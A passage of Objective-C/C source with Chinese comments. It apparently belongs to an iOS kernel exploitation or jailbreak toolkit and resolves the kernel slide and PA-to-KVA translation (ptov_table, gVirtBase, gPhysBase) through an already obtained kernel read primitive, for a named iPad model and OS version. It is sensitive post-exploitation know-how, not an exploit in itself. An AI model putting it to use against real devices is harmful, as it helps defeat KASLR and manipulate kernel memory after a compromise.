        text_append(t, "  ⇒ ptov_table 不可信：表读不出来；查表路径停用，PA→KVA 走兜底公式\n");
        return;
    }

    /*
     * 整张表读进来了，先原样收下 —— 后面无论判成合不合法，调用方手里都有这份数据。
     * （这一句必须在读成功之后：放在前面搬的会是一段被清零的数组。）
     */
    memcpy(out, table, tableSize);

    /*
     * ── 原始 dump 段已删（2026-09-22）──────────────────────────────────────
     *
     * 这一段原本打 96 字节机器字 + 逐字节 hex，本意是"让人一眼看出字段边界"。
     * 实际结果是反的：**它害人抄错四次**（漏读一位、把定宽的 `%.18llx` 当成位宽异常、
     * 两次看错位），而每一次抄错都改变结论、并烧掉一轮设备实验。
     *
     * 现在字段边界由下面的 [ptov原始] 段按结构体解释后**定宽**打印，结论由代码给。
     * 观测格式如果让观察者更容易犯错，那它就不是在帮忙。
     */

    /*
     * 首项三档试读也已删。它原本想在"符号地址不是表头"时靠错位找到对的那一项，
     * 但实际上符号地址若真偏了，偏多少完全未知，三档（-24/0/+24）覆盖不了；
     * 而它的输出又要靠人从屏幕抄 —— 与上面删掉的那两段同样的毛病。
     * 真要判"符号偏了"，靠的是 [符号运行时] 那组差值的互相印证，不是这一档。
     */

    /*
     * 逐项按结构体解释并**全部打印**，合法性判定留到循环之后。
     *
     * 这里以前是"第一项不合法就 return" —— 那会让诊断只留下 ptov[0] 一行，
     * 另外 7 项永远看不到，而"整张表长什么样"恰恰是判断布局的关键证据。
     * 判定该由结论承担，不该由打印顺序承担。
     */
    uint64_t valid = 0;
    bool allValid = true;
    uint64_t shown = 0;
    for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT; i++) {
        if (table[i].len == 0) {
            text_append(t, "  ptov[%llu] len=0 → 按 perf.h:240 视为表结束\n",
                        (unsigned long long)i);
            break; /* 表结束（perf.h:240） */
        }

        const bool itemValid = km_slide_kernel_ptr(table[i].va) &&
                               table[i].pa < (1ULL << 48) &&
                               table[i].len < (1ULL << 48);
        text_append(t, "  ptov[%llu]%s pa=%#llx va=%#llx len=%#llx\n",
                    (unsigned long long)i,
                    itemValid ? "" : " 【形态不合法】",
                    (unsigned long long)table[i].pa,
                    (unsigned long long)table[i].va,
                    (unsigned long long)table[i].len);
        shown++;
        if (itemValid) {
            valid++;
        } else {
            allValid = false;
        }
    }

    /*
     * ── 布局自判：把三种字段顺序都试一遍，看哪一种三项形态全过 ──────────────
     *
     * 为什么要把这件事交给代码：设备上的原始字节靠人从屏幕抄，抄错一位就得出
     * 完全相反的结论（这件事已经发生过好几次）。而"哪一种字段顺序能让全部 8 项
     * 同时通过形态检查"是纯算术、可穷举的判据 —— 代码做它比人可靠。
     *
     * 三种顺序对应三种真实可能：上游定义的 {pa,va,len}、按 {va,pa,len} 存的、
     * 以及 {pa,len,va}。哪一组连续 8 项全过，就是它。
     */
    {
        static const char *const names[3] = { "pa,va,len", "va,pa,len", "pa,len,va" };
        for (int perm = 0; perm < 3; perm++) {
            uint64_t okCount = 0;
            bool ok = true;
            for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT; i++) {
                const uint64_t w0 = table[i].pa, w1 = table[i].va, w2 = table[i].len;
                uint64_t pa = 0, va = 0, len = 0;
                if (perm == 0)      { pa = w0; va = w1; len = w2; }
                else if (perm == 1) { va = w0; pa = w1; len = w2; }
                else                { pa = w0; len = w1; va = w2; }

                if (len == 0) break; /* 表结束 */
                if (pa >= (1ULL << 48) || !km_slide_kernel_ptr(va) || len >= (1ULL << 48)) {
                    ok = false;
                    break;
                }
                okCount++;
            }
            text_append(t, "  [布局自判] {%s}：%s（通过 %llu 项）\n",
                        names[perm], ok ? "全部通过" : "有不合法项",
                        (unsigned long long)okCount);
        }
    }

    /*
     * ── 表格原件：每项一行、值定宽 ──────────────────────────────────────
     *
     * 为什么单列这一段：前面的 raw / hex 两段都要靠人从屏幕抄字节，抄错一位结论
     * 就反了（已经发生过多次）。这一段把每项的三个 64 位值**按固定宽度**打全，
     * 一行就是一项 —— 不漏字段、不跨行、不怕截断，抄下来即可复算。
     */
    text_append(t, "  [ptov原始] 符号运行时=%#llx，每项 {w0, w1, w2}：\n",
                (unsigned long long)tableAddr);
    for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT; i++) {
        const uint64_t w0 = table[i].pa, w1 = table[i].va, w2 = table[i].len;
        text_append(t, "    [%llu] %016llx %016llx %016llx\n",
                    (unsigned long long)i,
                    (unsigned long long)w0,
                    (unsigned long long)w1,
                    (unsigned long long)w2);
        if (w0 == 0 && w1 == 0 && w2 == 0) break;
    }

    /*
     * 顺带把 XPF 各符号的**运行时地址**（符号 + slide）也列出来。
     * 这几个量是交叉验证 ptov 表的抓手：表里若有哪一段覆盖了它们，换算结果必须自洽。
     *
     * 定宽输出 + 同时给链接期值：从屏幕抄长度不定的十六进制已经出错四次
     * （把 `%.18llx` 的定宽当成位宽异常、漏读一位、把 0xfffffe00077 看成 0xfffffe00167…），
     * 所以这里两个值都按固定 18 位打，少一位就是异常。
     */
    {
        static const char *const syms[] = {
            "kernelSymbol.gVirtBase", "kernelSymbol.gPhysBase", "kernelSymbol.gPhysSize",
            "kernelSymbol.cpu_ttep",  "kernelSymbol.phystokv", "kernelSymbol.allproc",
            "kernelSymbol.ptov_table",
        };
        text_append(t, "  [符号运行时] 每行：符号链接期值 → 运行时值（= 链接期 + slide）：\n");
        for (size_t i = 0; i < sizeof(syms) / sizeof(syms[0]); i++) {
            const uint64_t sym = km_xpf_resolve_symbol(@(syms[i]));
            if (sym == 0) {
                text_append(t, "    %-26s （取不到）\n", syms[i]);
                continue;
            }
            text_append(t, "    %-26s %#018llx → %#018llx\n",
                        syms[i],
                        (unsigned long long)sym,
                        (unsigned long long)(sym + slide));
        }

        /*
         * ── gVirtBase 的口径（旧版这一段是错的，本轮修正）──────────────────────
         *
         * 旧版把两个**不同种类**的量放在一起"对账"：`gvirtSym + slide` 是 gVirtBase
         * **这个变量的地址**，`run->virtBase` 是该地址上的**值** —— 两者本来就不该相等。
         * 真机上它打出"两者相差 0x42d6198（实读偏小）"，那不是异常，是这行对账本身
         * 没有意义，白烧一轮排查。
         *
         * 有意义的问题是"读回来的这个值**像不像** physmap 的虚拟起点"：它必须落在
         * 内核地址域里、且页对齐（16 KB）。符号地址只作为"我们从哪儿读的"列出来。
         */
        {
            const uint64_t gvirtSym  = km_xpf_resolve_symbol(@"kernelSymbol.gVirtBase");
            const uint64_t at        = (gvirtSym != 0) ? (gvirtSym + slide) : 0;
            const uint64_t got       = run->virtBase;
            const bool     inDomain  = km_slide_kernel_ptr(got);
            const bool     pageAlign = ((got & 0x3fffULL) == 0);

            text_append(t, "  [gVirtBase] 读自 %#llx（符号+slide，这是变量地址不是值）→ 实读值 %#llx\n",
                        (unsigned long long)at, (unsigned long long)got);
            text_append(t, "  [gVirtBase 形态] 内核域=%s 16K 页对齐=%s ⇒ %s\n",
                        inDomain ? "是" : "否",
                        pageAlign ? "是" : "否",
                        (inDomain && pageAlign) ? "可用" : "不可用");
        }

    }

    /*
     * ── 结论：整表形态（③，原有）+ 两条代数判据（①②）全过 = 可信 ─────────────
     *
     * 三道判据共用一个出口：不可信时**不**拒绝整条流水线（本函数已无失败出口），
     * 只把"查表停用"这件事记下来 —— 兜底公式不依赖这张表（见本函数上方那段注释）。
     */
    const bool shapeOk = (valid > 0) && allValid;
    if (valid == 0) {
        text_append(t, "  上面 %llu 项没有一项通过形态检查（表是空的，或全部不合法）\n",
                    (unsigned long long)shown);
    } else if (!allValid) {
        text_append(t, "  上面 %llu 项里有形态不合法的项：整表不可信 —— "
                       "半张表比没有表更危险（缺的那一段会让段内地址被算成段外）。\n",
                    (unsigned long long)shown);
    }

    const bool deltaOk = slide_ptov_delta_invariant(run, t);
    const bool rangeOk = slide_ptov_va_in_range(run, t);
    run->ptovTrusted = shapeOk && deltaOk && rangeOk;

    text_append(t, "  当前在用的基准：gVirtBase=%#llx gPhysBase=%#llx gPhysSize=%#llx\n",
                (unsigned long long)run->virtBase,
                (unsigned long long)run->physBase,
                (unsigned long long)run->physSize);

    if (!run->ptovTrusted) {
        text_append(t, "⑥ ptov_table 不可信：整表形态=%s、判据① 偏移恒定=%s、判据② va 值域=%s\n",
                    shapeOk ? "通过" : "不通过",
                    deltaOk ? "通过" : "不通过",
                    rangeOk ? "通过" : "不通过");
        text_append(t, "  ⇒ km_phystokv 停用查表，直接走兜底公式 pa - gPhysBase + gVirtBase"
                       "（它不需要 ptov_table）\n");
        slide_check_ptov_against_anchor(run, t);
        return;
    }

    /* out 已在函数开头拷过（那时表刚读进来），这里不再重复。 */
    text_append(t, "⑥ ptov_table=%#llx（符号 %#llx + slide）可信：%llu 项三道判据全过，"
                   "查表路径启用\n",
                (unsigned long long)tableAddr, (unsigned long long)symbol,
                (unsigned long long)valid);
    text_append(t, "  ⇒ km_phystokv 先查这 8 段，落空再走兜底公式 pa - gPhysBase + gVirtBase\n");
    slide_check_ptov_against_anchor(run, t);
}

/*
 * ── 用独立锚点验证这张表本身 ─────────────────────────────────────────────
 *
 * 判据：`gVirtBase` 是内核数据段自己的内核虚拟地址（由 XPF 走另一条推导链给出，
 * 与 ptov_table 的 finder 互不依赖）。表里必须存在某一项，它的物理范围覆盖
 * `gVirtBase` 所对应的物理地址 —— 即那一项应满足
 *
 *     va <= gVirtBase < va + len
 *
 * 成立就说明这张表确实描述着本机内核的映射；**一项都不覆盖，就说明表被定位错了**
 * （或者布局读错），而不是"表项长得奇怪"。
 *
 * 这一步是纯算术、零 kread：只用已经读到的值和已解析的符号。
 */
static void slide_check_ptov_against_anchor(const km_slide_run *run, km_slide_text *t)
{
    if (run->virtBase == 0) {
        text_append(t, "  [锚点校验] gVirtBase 未读到，无法校验表的位置\n");
        return;
    }
    if (run->ptov[0].len == 0) {
        text_append(t, "  [锚点校验] 表首项 len=0，无表可校\n");
        return;
    }

    const uint64_t anchor = run->virtBase;
    uint64_t covering = 0;
    for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT; i++) {
        const uint64_t va = run->ptov[i].va;
        const uint64_t len = run->ptov[i].len;
        if (len == 0) break;
        if (anchor >= va && anchor < (va + len)) {
            covering++;
            text_append(t, "  [锚点校验] gVirtBase=%#llx 落在 ptov[%llu]（va=%#llx len=%#llx）内\n",
                        (unsigned long long)anchor, (unsigned long long)i,
                        (unsigned long long)va, (unsigned long long)len);
        }
    }

    if (covering == 0) {
        text_append(t, "  [锚点校验] 没有任何一项覆盖 gVirtBase=%#llx —— "
                       "这张表不是描述本机内核映射的（符号定位错了，或布局读错了）\n",
                    (unsigned long long)anchor);
    } else {
        text_append(t, "  [锚点校验] 通过：%llu 项覆盖该锚点\n", (unsigned long long)covering);
    }

    text_append(t, "  [锚点校验] 三个基准的运行时地址：gVirtBase=%#llx gPhysBase=%#llx gPhysSize=%#llx\n",
                (unsigned long long)run->virtBase,
                (unsigned long long)run->physBase,
                (unsigned long long)run->physSize);
}

/*
 * 读回 gVirtBase / gPhysBase / gPhysSize，逐行对照 perf.h:153-163。
 * 三者的形态判据各自不同，不能共用一条：
 *   gVirtBase 是内核虚拟地址（所以走 km_slide_kernel_ptr）；
 *   gPhysBase 是物理地址（非 0、且 < 2^48）；
 *   gPhysSize 是长度（> 0、且 < 2^48）。
 */
static bool slide_read_bases(uint64_t slide, km_slide_run *run, km_slide_text *t)
{
    /*
     * 键名用 C 字符串、进函数再转 NSString：这个结构体刻意不装 ObjC 类型，
     * 免得它的初始化牵扯到 ARC 语义（本文件在工程里没有单独钉 ARC 开关）。
     */
    struct {
        const char *key;
        const char *name;
        uint64_t   *slot;
    } fields[3] = {
        { "kernelSymbol.gVirtBase", "gVirtBase", &run->virtBase },
        { "kernelSymbol.gPhysBase", "gPhysBase", &run->physBase },
        { "kernelSymbol.gPhysSize", "gPhysSize", &run->physSize },
    };

    /*
     * ── 这一步的判据（口径本轮修正过，写清楚免得又被带偏）─────────────────
     *
     * `slide_read64()` 的 `*ok` 只说明"两次读到同一个值"，**不说明那个值是对的**：
     * kread 打在一个仍然映射、但内容已被改成别的东西的地址上时，会稳定地读回一个
     * 稳定但错误的值。所以判据落在"值本身是否可信"上：读回实读值之后，自己检查它
     * 是否落在该有的域里、是否对齐（见下面每一行的【形态不合法】）。
     *
     * 明确一条**被做错过的口径**（真机上白烧过一轮排查，别再走回去）：不能拿
     * "符号 + slide"当"期望值"去和实读值比 —— 前者是 gVirtBase **这个变量的地址**，
     * 后者是该地址上的**值**，两者本来就不该相等。真机上那行打出"相差 0x4E56198
     * （非 16K 倍数）"，于是被误读成"gVirtBase 的值不对"；本轮真机又读到
     * gVirtBase=0xfffffe001e57c000 / gPhysBase=0x80257c000，两者页对齐、互相对得上，
     * 是可信的。变量地址只用于回答"我们从哪儿读的"。
     *
     * 另外：**任何一个基准失败都不再中止流程**。以前一失败就 return，于是
     * "实读值到底能不能用"这个问题永远得不到回答 —— 而它才是真正决定
     * 下一步走哪条路的那一个。
     */
    bool okVirt = false, okPhys = false, okSize = false;

    for (size_t i = 0; i < 3; i++) {
        NSString *key = [NSString stringWithUTF8String:fields[i].key];
        const uint64_t symbol = km_xpf_resolve_symbol(key);
        if (symbol == 0) {
            text_append(t, "  XPF 取不到 %s\n", fields[i].name);
            continue;
        }

        const uint64_t addr = symbol + slide;
        bool readOk = false;
        const uint64_t value = slide_read64(addr, &readOk);

        if (!readOk) {
            text_append(t, "  %s：地址 %#llx（符号 %#llx + slide）读失败\n",
                        fields[i].name, (unsigned long long)addr, (unsigned long long)symbol);
            continue;
        }
        *fields[i].slot = value;

        /* 各自按自己的域判：虚拟地址走内核地址判据，物理/长度看是否落在 2^48 内。 */
        bool valid = false;
        if (i == 0) {
            valid = km_slide_kernel_ptr(value);
            okVirt = valid;
        } else if (i == 1) {
            valid = (value != 0) && (value < (1ULL << 48)) && ((value & 0x3fff) == 0);
            okPhys = valid;
        } else {
            valid = (value != 0) && (value < (1ULL << 48));
            okSize = valid;
        }

        text_append(t, "  %s：实读值 %#llx（读自 %#llx = 符号+slide，那是变量地址）%s\n",
                    fields[i].name,
                    (unsigned long long)value,
                    (unsigned long long)addr,
                    valid ? "" : "  【形态不合法】");
        if (!valid) {
            text_append(t, "      ↑ 读回来了，但这个值不满足 %s 该有的形态\n",
                        (i == 0) ? "内核虚拟地址（域 + 对齐）"
                                 : ((i == 1) ? "物理地址（非 0、< 2^48、16K 对齐）"
                                             : "长度（非 0、< 2^48）"));
        }
    }

    /*
     * 结论：这一步只回答"每一个读数本身可不可信"（gVirtBase 在内核域且页对齐、
     * gPhysBase 是页对齐的物理地址、gPhysSize 非 0 且在物理域里）—— 三项各自独立判，
     * 任一项不过都写明是哪一项、读到的值是多少。
     *
     * 为什么 gPhysSize 也必须在：它是兜底公式范围检查的除数（
     * `(pa - gPhysBase) >= gPhysSize` 即拒绝该 pa）。它为 0 时那个不等式恒真，
     * 兜底支对任何 pa 都返回 0，等于 PA→KVA 全灭 —— 它不是"缺了也无所谓"的那一项。
     * 三个值的**联合**判定不在这里做：交给提交点的 slide_fallback_usable()，
     * 免得同一件事在两处有两条口径。
     */
    const bool usable = okVirt && okPhys;
    text_append(t, "  ⑦ 判定：gVirtBase 可用=%s、gPhysBase 可用=%s、gPhysSize 可用=%s ⇒ "
                   "三个基准%s（联合判据在提交点）\n",
                okVirt ? "是" : "否", okPhys ? "是" : "否", okSize ? "是" : "否",
                (okVirt && okPhys && okSize) ? "齐了" : "不齐");

    if (!usable) {
        text_append(t, "  基准不够用：上面每一行的【形态不合法】标出了是哪一项、读到的值是多少\n");
        return slide_refuse(run, t, "⑦ 全局基准",
                            okVirt ? "gPhysBase 不可用" : "gVirtBase 不可用");
    }

    text_append(t, "⑦ gVirtBase=%#llx gPhysBase=%#llx gPhysSize=%#llx\n",
                (unsigned long long)run->virtBase,
                (unsigned long long)run->physBase,
                (unsigned long long)run->physSize);
    return true;
}

/// 把 8 项表与三个全局摊开写进诊断（成功路径专用）。
static void slide_report_tables(const km_slide_run *run, km_slide_text *t)
{
    /*
     * 先说结论：上层真正要知道的是两件事 —— "现在走哪条路"和"在用的是哪三个值"。
     * 表本身是"可以不用"的东西（判据见 slide_read_ptov_table 上方那段注释），
     * 所以它排在这两行之后。
     */
    text_append(t, "== PA → KVA 当前状态 ==\n");
    text_append(t, "  ptov_table：%s\n",
                run->ptovTrusted
                    ? "可信 —— km_phystokv 先查它的 8 段，落空再走兜底"
                    : "不可信 —— km_phystokv 不查表，直接走兜底公式（哪条判据不过见上面⑥）");
    text_append(t, "  在用公式：兜底 pa - gPhysBase + gVirtBase，"
                   "范围检查 [gPhysBase, gPhysBase + gPhysSize)\n");
    text_append(t, "  gVirtBase=%#llx gPhysBase=%#llx gPhysSize=%#llx\n",
                (unsigned long long)run->virtBase,
                (unsigned long long)run->physBase,
                (unsigned long long)run->physSize);

    text_append(t, "== ptov_table（perf.h:232-248 的 8 段查表；%s）==\n",
                run->ptovTrusted ? "本机已采信" : "本机未采信，仅供参考");
    for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT; i++) {
        if (run->ptov[i].len == 0) break;
        text_append(t, "  [%llu] pa=%#llx va=%#llx len=%#llx\n",
                    (unsigned long long)i,
                    (unsigned long long)run->ptov[i].pa,
                    (unsigned long long)run->ptov[i].va,
                    (unsigned long long)run->ptov[i].len);
    }

    /*
     * 交叉对照：xnu 在 arm_vm_init 里把启动期的物理内存段写进 ptov_table，所以
     * 某项的 (pa, va) 往往与 (gPhysBase, gVirtBase) 一致。
     * 这里只**报告**有没有匹配，不当判据 —— 我没有目标机型（iPad14,3 /
     * iPadOS 16.4.1）的第一手证据证明这条恒成立，拿它当判据会让正确的表在某些
     * 机型上被拒。
     *
     * 表已被判为不可信时**不输出**这一段：那时表里每一项都可能来自别的全局，
     * 打印"没有哪一项对得上"会被读成又一条证据，而它此刻什么也不说明。
     */
    if (!run->ptovTrusted) {
        text_append(t, "  交叉对照：表未采信，本段不输出（避免把噪音当证据）\n");
        return;
    }
    for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT; i++) {
        if (run->ptov[i].len == 0) break;
        if (run->ptov[i].pa == run->physBase && run->ptov[i].va == run->virtBase) {
            text_append(t, "  交叉对照：ptov[%llu] 与 (gPhysBase, gVirtBase) 一致（仅供参考）\n",
                        (unsigned long long)i);
            return;
        }
    }
    text_append(t, "  交叉对照：没有哪一项的 (pa, va) 与 (gPhysBase, gVirtBase) 相同（仅供参考）\n");
}

/*
 * 换算抽样 —— 面板上那条「把 gPhysBase 当 PA 喂进去」的验证。
 *
 * 先把强度说清楚，免得被读成"表已验证"：pa = gPhysBase 时，兜底支
 * `pa − gPhysBase + gVirtBase` 恒等于 gVirtBase，所以这一条验证的是**换算通路
 * 与符号读取成立**（输出该落回 gVirtBase、且必须是内核 VA），**不是**"ptov_table
 * 的每一段都正确"。
 *
 * 更强的对偶判据是上游 perf.h:168 / :173 那条
 *     phystokv(pmap->ttep) == pmap->tte
 * 它需要读 current_pmap 的 tte / ttep 两个字段 —— 那要 KernelMemory.m 再暴露一个
 * 访问器，本轮没做（见报告里的"遗留风险"）。
 */
static void slide_report_phystokv_probe(const km_slide_run *run, km_slide_text *t)
{
    const uint64_t pa = run->physBase;

    /*
     * 用无锁版本：本函数跑在 slide_run_locked 的临界区里，而公开的 km_phystokv()
     * 会再去取同一把锁。pthread 的普通互斥锁不是递归的 —— 同一线程二次加锁的行为
     * 未定义（这里是自锁空转或 EDEADLK，两者都不会自己恢复）。
     * 这一点是写完后复查代码时发现的，不是设备上撞出来的；留个记号免得被"顺手改回去"。
     */
    const uint64_t kva = slide_phystokv_locked(pa);

    text_append(t, "== phystokv 抽样 ==\n");
    text_append(t, "  pa=%#llx → kva=%#llx", (unsigned long long)pa, (unsigned long long)kva);

    if (kva == 0) {
        text_append(t, "（换算失败：%s）\n",
                    run->ptovTrusted
                        ? "既不在 8 段内，也不在 [gPhysBase, gPhysBase+gPhysSize) 内"
                        : "ptov_table 已停用（判据见上面⑥），且 pa 不在 [gPhysBase, gPhysBase+gPhysSize) 内");
        return;
    }
    if (!km_slide_kernel_ptr(kva)) {
        text_append(t, " 不在内核地址范围，可疑\n");
        return;
    }
    text_append(t, " 在内核地址范围 %s\n",
                (kva == run->virtBase) ? "（且等于 gVirtBase，符合兜底支预期）" : "（注意：不等于 gVirtBase）");
}

#pragma mark - 主流程（持锁执行）

static bool slide_run_load_tables(km_slide_run *run, km_slide_text *t)
{
    /*
     * 顺序是刻意的：**先读 gVirtBase/gPhysBase/gPhysSize，再读 ptov_table**。
     *
     * 为什么不能反过来（这曾经是反的）：ptov_table 失败就 return，于是那三个值
     * 永远读不到 —— 而它们在 XPF 里走的是**另一条独立且更稳的推导**
     * （xpf_find_arm_vm_init_reference(n)：从 arm_vm_init 里找第 n 个 STR），
     * 不依赖 phystokv。而 ptov_table 的 finder 恰恰依赖 phystokv
     * （xpf_find_ptov_table 从 phystokv 的反汇编里找第 2 个 LDR），
     * phystokv 本身又是靠"arm_vm_init 里第几个 bl"推的（上游为 ARM_LARGE_MEMORY
     * 加过 n=2 特判，说明这个假设在不同内核布局上变过）。
     *
     * 两层脆弱推导叠在一起，`ptov_table` 的符号地址就有可能是错的。那三个值读得
     * 到的话，就有一个独立的锚去判断表对不对 —— 读不到它们，连判断的余地都没有。
     *
     * 本轮再给这个顺序加一条理由：表的**可信判据**（slide_ptov_delta_invariant /
     * slide_ptov_va_in_range）就是用 `gVirtBase - gPhysBase` 做期望偏移、用
     * `gVirtBase + gPhysSize` 做上界 —— 三个基准先到位，判据才有得比。
     */
    slide_read_bases(run->slide, run, t);

    /*
     * 这一步**没有失败出口**（返回 void）：表读不到、或不可信，都只记进
     * run->ptovTrusted 与诊断，不再让整条 resolve 失败。真机实测的理由见
     * slide_read_ptov_table 上方那段判据注释：读到的是邻近的标量全局、整张表是假的，
     * 而三个基准是可信的，兜底公式也不需要这张表。
     */
    slide_read_ptov_table(run->slide, run->ptov, run, t);

    /*
     * 提交前的联合判据：只有它成立才允许置 g_convertReady。三个基准缺任何一个，
     * 兜底公式都算不出可用地址（physSize 为 0 时范围检查恒真，见
     * slide_fallback_usable 的注释）—— 那时如实报失败，不提交半个状态。
     */
    const bool fallbackUsable = slide_fallback_usable(run->virtBase, run->physBase, run->physSize);
    text_append(t, "  ⑧ 提交判定：兜底公式（pa - gPhysBase + gVirtBase）%s；ptov_table %s\n",
                fallbackUsable ? "可用" : "不可用",
                run->ptovTrusted ? "可信（查表启用）" : "不可信（查表停用）");
    if (!fallbackUsable) {
        text_append(t, "  三个基准没有同时可用 ⇒ 兜底公式用不了（见上面每一行的读数与形态判定）\n");
        /* ⑦ 那一步给出的原因更具体（是哪一项不可用），不要用更笼统的话盖掉它。 */
        if (run->failure[0] != '\0') return false;
        return slide_refuse(run, t, "⑦ 换算基准", "兜底公式不可用：三个基准未同时到位");
    }

    /*
     * 提交：唯一写全局的地方，避免下游读到"slide 有了、基准只读了一半"的中间状态。
     *
     * 表按可信与否分别处理 —— 不可信时提交一张**空表**（memset 0，而不是把假数据
     * 落进全局）：这样即使将来有人在别处漏判了 g_ptovTrusted 就去查表，
     * 空表（len 全 0）也只会查不到，而不是算出一个段外地址。
     */
    if (run->ptovTrusted) {
        memcpy(g_ptov, run->ptov, sizeof(g_ptov));
    } else {
        memset(g_ptov, 0, sizeof(g_ptov));
    }
    g_ptovTrusted = run->ptovTrusted;
    g_virtBase = run->virtBase;
    g_physBase = run->physBase;
    g_physSize = run->physSize;
    g_convertReady = true;

    slide_report_tables(run, t);
    slide_report_phystokv_probe(run, t);
    return true;
}

/*
 * 真正干活的部分：**调用者必须已经持有 g_slideLock**。
 *
 * 全程只读内核内存，不写一个字节，也不改任何内核状态 —— 所以失败不留残留，
 * 重试是安全的（与 kopen 那条路不同：那里的失败会留下悬空 PTE 与半裁开的
 * vm_map 条目，因此那边是"一次失败即终止本次会话"）。
 */
static bool slide_run_locked(km_slide_text *t)
{
    km_slide_run run = {};
    run.fd = -1;

    bool ok = slide_run_prepare(&run, t);
    if (ok) ok = slide_run_find_slide(&run, t);

    /* 任何提前失败路径都不漏 fd（find_slide 成功时已经关过，这里会跳过）。 */
    if (run.fd >= 0) {
        close(run.fd);
        run.fd = -1;
    }

    if (ok) ok = slide_run_load_tables(&run, t);

    /*
     * 发布点（全流程唯一一处写全局的 slide）：run.slide 只有在自检通过后才被赋值
     * （见 slide_run_find_slide 末尾），所以这里写进全局的永远是"已通过 Mach-O 头
     * 验证"的那个值 —— 哪怕后面的换算表读失败了也照发，因为它对上层单独有用
     * （按链接期 vmaddr 反推运行时地址），不该被一起丢掉。
     */
    if (run.slideVerified) {
        g_slide = run.slide;
        g_kernelBase = run.kernelBase;
    }

    if (ok) {
        /*
         * 摘要一句话要说清"现在走哪条路"：ptov_table 可信与否决定查表是否启用，
         * 两种情况都算成功（兜底公式不依赖那张表）。缓冲区扩到 256 ——
         * 中文摘要按 UTF-8 三字节/字算，192 字节会把后半个括注截掉。
         */
        char summary[256];
        snprintf(summary, sizeof(summary),
                 "slide=%#llx kernel_base=%#llx（链接基址 %#llx，来源 %s）"
                 "PA→KVA=ready（%s）",
                 (unsigned long long)run.slide, (unsigned long long)run.kernelBase,
                 (unsigned long long)run.linkBase.addr,
                 run.linkBase.fromXPF ? "XPF" : "常量",
                 run.ptovTrusted ? "8 段查表 + 兜底支"
                                 : "兜底支；ptov_table 不可信，查表已停用");
        slide_diag_finalize(summary);
        g_slideSettled = true;
        return true;
    }

    char summary[256];
    snprintf(summary, sizeof(summary), "未完成 @%s%s",
             run.failure[0] ? run.failure : "（未知步骤）",
             run.slideVerified
                 ? "；slide 已通过自检，但 PA→KVA 未建立（三个基准未同时到位，见⑦⑧）"
                 : "");
    slide_diag_finalize(summary);
    return false;
}

#pragma mark - 对外接口

/// 已经整体成功过（短锁读，供 resolve 的幂等守卫）。
static bool slide_settled(void)
{
    pthread_mutex_lock(&g_slideLock);
    const bool settled = g_slideSettled;
    pthread_mutex_unlock(&g_slideLock);
    return settled;
}

bool km_slide_resolve(void)
{
    if (slide_settled()) return true;

    /*
     * ── 锁外：只做"要不要跑"的判断与 XPF 预备 ──
     *
     * 不放锁内是因为 km_xpf_init 要解压解析几十 MB 的 kernelcache，可能几十秒；
     * 占着锁会让另一个线程的 km_slide_value() / km_phystokv() 一起被堵住。
     * 真正碰内核的那一段（不到 30 次 kread）才进锁，那是毫秒级。
     */
    if (!km_ready()) {
        pthread_mutex_lock(&g_slideLock);
        slide_diag_reset();
        km_slide_text t = { g_diagBody, sizeof(g_diagBody), 0 };
        text_append(&t, "① 前置失败：内核读写层未就绪（km_init 未成功）\n");
        slide_diag_finalize("未完成 @① 前置 — 内核读写层未就绪（km_init 未成功）");
        pthread_mutex_unlock(&g_slideLock);
        return false;
    }

    if (!km_xpf_ready() && !km_xpf_init()) {
        NSString *xpfError = km_xpf_last_error();
        pthread_mutex_lock(&g_slideLock);
        slide_diag_reset();
        km_slide_text t = { g_diagBody, sizeof(g_diagBody), 0 };
        text_append(&t, "① 前置失败：XPF 初始化未成功\n%s\n",
                    xpfError ? xpfError.UTF8String : "(没有错误文本)");
        slide_diag_finalize("未完成 @① 前置 — XPF 初始化失败（失败原因见下面几行）");
        pthread_mutex_unlock(&g_slideLock);
        return false;
    }

    pthread_mutex_lock(&g_slideLock);

    /* 进锁后再看一眼：另一个线程可能刚好在我们做 XPF 的时候把它跑完了。 */
    if (g_slideSettled) {
        pthread_mutex_unlock(&g_slideLock);
        return true;
    }

    slide_diag_reset();
    km_slide_text t = { g_diagBody, sizeof(g_diagBody), 0 };
    const bool ok = slide_run_locked(&t);

    pthread_mutex_unlock(&g_slideLock);
    return ok;
}

uint64_t km_slide_value(void)
{
    pthread_mutex_lock(&g_slideLock);
    const uint64_t value = g_slide;
    pthread_mutex_unlock(&g_slideLock);
    return value;
}

uint64_t km_slide_kernel_base(void)
{
    pthread_mutex_lock(&g_slideLock);
    const uint64_t value = g_kernelBase;
    pthread_mutex_unlock(&g_slideLock);
    return value;
}

bool km_phystokv_ready(void)
{
    /*
     * 判据是"兜底公式可用"，而不再是"整条 slide 流水线成功"（旧语义）。
     *
     * 两件事分开看：
     *   · g_convertReady —— 三个基准已经在同一个临界区里提交过（防中间状态）；
     *   · slide_fallback_usable(g_virtBase, g_physBase, g_physSize) —— 提交出去的
     *     那三个值此刻仍满足公式的前置（非 0、各在自己的域里）。在锁内复算一遍是
     *     刻意的："就绪"这个词要落在**真正被使用的公式**上，而不是某个标志的时序上。
     * ptov_table 不参与这个判据：它不可信只让查表停用，兜底照跑（真机就是这样）。
     */
    pthread_mutex_lock(&g_slideLock);
    const bool ready = g_convertReady &&
                       slide_fallback_usable(g_virtBase, g_physBase, g_physSize);
    pthread_mutex_unlock(&g_slideLock);
    return ready;
}

bool km_phystokv_ensure(void)
{
    /*
     * 已就绪是空操作。这一句也是幂等的全部：整条流水线成功后 g_slideSettled 为真，
     * 重复调用在 km_slide_resolve() 的入口就返回了，不会再碰内核。
     */
    if (km_phystokv_ready()) return true;

    /*
     * 内核读写层没就绪时**不去**初始化 XPF：XPF 的 finder 要在设备上的 kernelcache
     * 文件上跑，而这一步本身不需要 kread —— 但建立换算表要（读符号内容、读
     * ptov_table）。先初始化 XPF 再失败，只会把一个几十秒的耗时放进一条注定失败的
     * 路径里，还会把 XPF 的失败诊断盖在真正的原因（内核层未就绪）上面。
     */
    if (!km_ready()) return false;

    /*
     * 判据**只看 PA→KVA 能不能用**，不看 km_slide_resolve() 的返回值。
     *
     * 这不是造型问题：`km_slide_resolve()` 的 true/false 是"整条流水线（slide +
